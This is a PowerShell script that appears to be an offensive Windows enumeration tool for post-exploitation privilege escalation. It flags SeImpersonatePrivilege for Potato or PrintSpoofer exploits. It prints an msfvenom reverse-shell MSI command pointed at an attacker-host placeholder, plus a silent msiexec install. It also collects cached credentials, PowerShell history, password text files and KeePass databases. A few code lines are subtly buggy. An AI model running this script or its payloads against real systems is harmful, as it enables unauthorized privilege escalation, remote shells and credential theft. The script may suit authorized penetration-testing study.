######## Draztick's Windows Enumeration Checklist Script

param (
  [string]$OutFile
)

# This function checks the provided filename for the OutFile parameter and whether it exists in the current working directory. if it does, it splits the name based on the period in the file extension, and then injects the date and time into the filename.
function Test-Filename {
  param (
    [string]$Filename
  )

  $date = Get-Date -Format "yyyy-MM-dd_HHmmss"
  $test = Test-Path -Path $Filename
  if ($test -eq $true) {
    $a, $b = $Filename.Split(".")
    $newFilename = $a + "_" + $date + '.' + $b
    return $newFilename
  }
  else {
    return $Filename
  }
}

# this function is the file writing function. It handles writing headers to the output file, data to the output file, and both to the output file. Default values are both None as $null was not working and this allowed me to overcome an error where the optional parameters were functioning as true optional parameters.
function Write-OutFile {
  param (
    [string]$OutFile,
    [string]$Data = 'None',
    [string]$Header = 'None'
  )

  if ($Header -eq 'None' -and $Data -ne 'None') {
    $Data | Out-File -FilePath $OutFile -Append
  }
  elseif ($Data -eq 'None' -and $Header -ne 'None') {
    $h = "######## " + $Header + " ########"
    $h | Out-File -FilePath $OutFile -Append
    "" | Out-File -FilePath $OutFile -Append
  }
  else {
    $h = "######## " + $Header + " ########"
    $h | Out-File -FilePath $OutFile -Append
    "" | Out-File -FilePath $OutFile -Append
    $Data | Out-File -FilePath $OutFile -Append
  }
}

# primary loop of the script. checks whether OutFile parameter was set. if not, it prints the usage info. Otherwise, it processes all of the enumeration.

if ($OutFile -ne "") {
  
  $Outf = Test-Filename -Filename $OutFile
  
  ### Low-Hanging Fruit
  # SeImpersonatePrivilege
  Write-Host "[*] Looking for Low-Hanging Fruit."
  Write-Outfile -Header "Low-Hanging Fruit" -OutFile $Outf

  $priv = whoami /priv | findstr "SeImpersonatePrivilege" | findstr "Enabled"

  if ($priv.Length -gt 0) {
    Write-Host "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!"
    Write-OutFile -Data "[+] SeImpersonatePrivilege is enabled! Elevate those privileges with PrintSpoofer or a Potato derivative!" -OutFile $Outf -Header "SeImpersonatePrivilege"
    # Read-Host -Prompt "Press Enter to continue..."
    Write-Host ""
  }

  # AlwaysInstallElevated
  $reg = Get-ItemPropertyValue -Path "REGISTRY::HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Ignore
  if ($reg -eq 1) {
    Write-Host "[+] Install a malicious MSI file to elevate privileges."
    Write-OutFile -Data "[+] Install a malicious MSI file to elevate privileges." -OutFile $Outf -Header "AlwaysInstallElevated"
    Write-Host "[+] msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi"
    Write-OutFile -Data "[+] msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi" -OutFile $Outf
    Write-Host "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi"
    Write-OutFile -Data "[+] msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi" -OutFile $Outf
    # Read-Host -Prompt "Press Enter to continue..."
    Write-Host ""
  }

  # Cached Credentials
  Write-Host "[!] Writing all potentially cached credentials..."
  $cmdkey = cmdkey /list
  $cmdkey2 = $($cmdkey -join "`r`n")
  Write-Host $cmdkey2
  Write-OutFile -Data $cmdkey2 -OutFile $Outf -Header "Cached Credentials"

  # PowerShell History
  Write-Host "[!] Writing Get-History to $Outf"
  $gh = Get-History
  $his = $($gh -join "`r`n")
  Write-OutFile -Data $his -OutFile $Outf -Header "Powershell History"
  
  $loc = (Get-PSReadlineOption).HistorySavePath
  $msg = "[!] Get-PSReadline Stored: {0}" -f $loc
  Write-Host $msg
  Write-OutFile -Data $msg -OutFile $Outf

  $content = Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction Ignore
  if ($null -ne $content) {
    Write-Host "[+] Found ConsoleHost_history.txt! Writing to $Outf."
    Write-Outfile -Data $content -OutFile $Outf -Header "History File"
    # Read-Host -Prompt "Press Enter to continue..."
  }

  # Password files in user directory.
  Write-Host "[*] Looking for password text files in user directory."
  $pwf = Get-ChildItem -Path C:\Users\ -Include *pass*.txt -File -Recurse -ErrorAction SilentlyContinue

  if ($null -ne $pwf) {
    $pwf | Write-Host
    Write-Outfile -Data $pwf -OutFile $Outf -Header "Password Text Files"
    # Read-Host -Prompt "Press Enter to continue..."
    Write-Host ""
  }

  ### Standard Enumeration
  Write-Host "[*] Beginning standard enumeration of asset."
  Write-Outfile -Header "Standard Enumeration" -Outfile $Outf

  $username = $env:USERNAME
  $hostname = hostname
  $a = $hostname + '\' + $username
  $users = Get-LocalUser | select-object -Property name | Out-String
  $group = get-localgroup | select-object -property name | out-string
  $mygroups = $(whoami /groups) -join "`r`n"
  $sys = $(systeminfo) -join "`r`n" #implement
  $ips = $(ipconfig /all) -join "`r`n" #implement
  $route = $(route print) -join "`r`n"#implement
  $conn = $(netstat -nao) -join "`r`n"#implement
  $process = Get-Process #implement


  Write-Host "Username: $username"
  Write-Host "Hostname: $hostname"
  Write-Outfile -Data "$username" -OutFile $Outf -Header "Username"
  Write-Host "Users:"
  $users | Write-Host
  Write-Outfile -Data $users -OutFile $Outf -Header "Local Users"
  Write-Host "Groups:"
  $group | Write-Host
  Write-Outfile -Data $groups -Outfile $Outf -Header "Groups"
  Write-Host "My Groups:"
  $mygroups | Write-Host
  Write-Outfile -Data $mygroups -OutFile $Outf -Header "My Groups"
  Write-Host ""

  ### Checking for Unquoted service paths.
  Write-Host "[*] Gathering unquoted service paths."
  $serv = Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object Name,DisplayName,StartMode,PathName | Out-String
  $serv | Write-Host
  Write-OutFile -Data $serv -OutFile $OutFile -Header "Unquoted Service Path"
  Write-Host ""
  
  # Look for useful files.
  Write-Host "[*] Looking for text files in in User's directory."
  $txt = Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
  if ($null -ne $txt) {
    $txt | Write-Host
    Write-OutFile -Data $($txt -join "`r`n") -OutFile $Outf -Header "Text Files"
    Write-Host ""
  }
  Write-Host "[*] Looking for other useful files in User's directory."
  $uf = Get-ChildItem -Path C:\Users\ -Include *.log,*.kdbx,*.csv,*.xml,*.xlsx,*.xls -File -Recurse -ErrorAction SilentlyContinue
  if ($null -ne $uf) {
    $uf | Write-Host
    Write-OutFile -Data $($uf -join "`r`n") -OutFile $Outf -Header 'Other Useful Files'
    Write-Host ""
  }
  Write-Host "[*] Searching for other useful files on this disk."
  $udb = Get-ChildItem -Path C:\ -Include *.kdbx,*.log,*.ini -File -Recurse -ErrorAction SilentlyContinue
  if ($null -ne $udb) {
    $udb | Write-Host
    Write-OutFile -Data $($udb -join "`r`n") -OutFile $Outf
    Write-Host ""
  }

  # Scheduled Tasks
  Write-Host "[*] Looking for scheduled tasks."
  $st = Get-ScheduledTask | Where-Object {$_.State -eq "Ready" -and $_.Author -notmatch "Microsoft" -and $_.Author -notmatch "Mozilla"} | Select-Object TaskName,Author,@{Name='RunAsUser'; Expression={$_.Principal.UserId}} | Out-String -Stream
  $($st -join "`r`n") | Write-Host
  Write-OutFile -Data $($st -join "`r`n") -OutFile $Outf -Header "Scheduled Tasks"
  Write-Host ""

  # Installed packages
  Write-Host "[*] Gathering installed packages through Registry."
  $in1 = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName | out-string -stream | where-object {$_.trim() -ne ""} | Out-String
  $in2 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object displayname | out-string -stream | where-object {$_.trim() -ne ""} | Out-String
  $in1 | Write-Host
  $in2 | Write-Host
  Write-OutFile -Data $($in1 -join "`r`n") -OutFile $Outf -Header "Installed Packages"
  Write-OutFile -Data $($in2 -join "`r`n") -OutFile $Outf
  Write-Host ""


  Write-Host "[!!!] All output saved to file $Outf."
}
else {
  Write-Host "Usage: winEnum.ps1 -OutFile <FILENAME>"
  Write-Host "Specify an output file name and try again."
}
